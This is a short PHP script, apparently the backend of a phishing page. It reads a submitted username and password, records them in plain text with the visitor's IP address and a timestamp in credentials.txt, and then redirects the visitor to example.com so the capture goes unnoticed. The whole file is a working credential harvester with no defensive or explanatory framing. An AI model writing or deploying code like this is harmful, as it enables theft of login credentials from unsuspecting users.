<?php
$username = $_POST['username'];
$password = $_POST['password'];
$ip = $_SERVER['REMOTE_ADDR'];
$date = date('Y-m-d H:i:s');

$data = "Username: $username | Password: $password | IP: $ip | Date: $date\n";

file_put_contents('credentials.txt', $data, FILE_APPEND);
header('Location: https://example.com');
exit();
?>